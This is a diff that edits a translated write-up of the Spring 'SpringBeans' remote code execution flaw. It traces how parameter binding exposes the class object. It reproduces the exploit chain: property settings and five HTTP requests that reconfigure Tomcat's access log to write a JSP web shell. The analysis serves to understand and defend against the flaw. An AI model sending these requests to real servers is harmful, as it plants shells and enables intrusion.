@@ -1,4 +1,4 @@
-This is a translated version of the Vulnerability Analysis document ([original here](https://github.com/tweedge/springcore-0day-en/blob/main/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%20(Vulnerability%20Analysis).pdf)) that the PoC author (`p1n93r`) released. It contains my own annotations as and dissections of screenshots as well. I hope it helps!
+This is a translated version of the Vulnerability Analysis document that the PoC author (`p1n93r`) released. It contains my own annotations as and dissections of screenshots as well. I hope it helps!
 
 # SpringBeans RCE Vulnerability Analysis (Translated)
 
@@ -19,12 +19,11 @@ https://github.com/p1n93r/spring-rce-war
 > *Analyst's note:* Gone, and no saved version. :/
 
 ## Vulnerability Analysis
-Spring parameter binding does not introduce too much, you can do it yourself; its basic usage is to use the form of `.` to assign values to parameters. The actual assignment process will use reflection to call the parameters `getter` or `setter`.
+I won't discuss details of Spring parameter binding, you can google it yourself; basically one uses the `.` notation to assign values to object properties. The actual assignment uses reflection to call the property's `getter` or `setter`.
 
-When this vulnerability first came out, I thought it was a rubbish hole, because I thought there was a Class type attribute in the parameters that I needed to use, and no fool would open it.
-I will use this property in POJOs; but when I follow it carefully, I find that things are not so simple.
+When this vulnerability first came out, I thought it was rubbish, because I thought this would require a Class type attribute on the parameter object, and no fool would include a Class type attribute in their POJO; but when I look at it carefully, I find that things are not so simple.
 
-For example, the data structure of the parameters I need to bind is as follows, which is a very simple POJO:
+For example, the data structure of the parameter I need to bind is as follows, which is a very simple POJO:
 
 ```
 /**
@@ -75,7 +74,7 @@ public void index(EvalBean evalBean, Model model) {
 }
 ```
 
-So I started the whole process of parameter binding. When I followed the call position as follows, I was stunned.
+So I started stepping through the whole parameter binding process. When I got to the call below, I was stunned.
 
 > *Analyst's notes on screenshot 1*
 >
@@ -95,14 +94,12 @@ When I looked at this "cache", I was stunned, why is there a "class" attribute c
 >
 > `"class" -> (GenericTypeAwarePropertyDescriptor@5848) *org.springframework.beans.GenericTypeAwarePropertyDescriptor ...`
 >
-> And comment: "There is actually a class. There is no need to store the class attribute in the POJO we use at all. When spring defines parameters, it will bring a class property used to refer to the POJO class to be bound."
+> And comment: "There is actually a class attribute. Our POJO doesn't need to have the class attribute at all. When spring binds parameters, it will bring a class property to reference the POJO class to be bound."
 
 
-When I saw this, I knew I was wrong, this is not a garbage hole, it is really a nuclear bomb-level loophole! Now it is clear that we can easily get the class pair.
+When I saw this, I knew I was wrong, this is not a garbage vulnerability, it is really a nuclear bomb-level vulnerability! Now it is clear that we can easily get the class object, the rest is to use this class object to construct the exploit chain. A relatively simple way is to modify Tomcat's logging config and write the shell to the log.
 
-For example, the rest is to use this class object to construct the utilization chain. At present, the simpler way is to modify the log configuration of Tomcat and write the shell to the log.
-
-The complete utilization chain is as follows:
+The complete exploit chain is as follows:
 
 ```
 class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7b%66%75%63%6b%7d%69
@@ -112,7 +109,7 @@ class.module.classLoader.resources.context.parent.pipeline.first.prefix=fuckJsp
 class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
 ```
 
-Looking at the utilization chain, you can see that it is a very simple way to modify the Tomcat log configuration and use the log to write a shell; the specific attack steps are as follows, and the following five requests are sent successively:
+Looking at the chain, you can see that it is very easy to modify the Tomcat logging config and use the log to write a shell; the specific attack steps are as follows, send the following five requests successively:
 
 ```
 http://127.0.0.1:8080/stupidRumor_war_exploded/index?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7b%66%75%6
@@ -122,7 +119,7 @@ http://127.0.0.1:8080/stupidRumor_war_exploded/index?class.module.classLoader.re
 http://127.0.0.1:8080/stupidRumor_war_exploded/index?class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
 ```
 
-After sending these five requests, Tomcat's log configuration is modified as follows:
+After sending these five requests, Tomcat's logging config is modified as follows:
 
 > *Analyst's notes on screenshot 3*
 >
@@ -166,5 +163,5 @@ The shell can be accessed normally:
 
 ## Summary
 
-* Now that the class object can be called, the use method must not write the log;
-* I can follow it later. Why is a POJO class reference retained during the parameter binding process?
+* Given that the class object can be called, there must be more ways to exploit this than writing the log;
+* Can follow up later, why does parameter binding keep a reference to the POJO class?
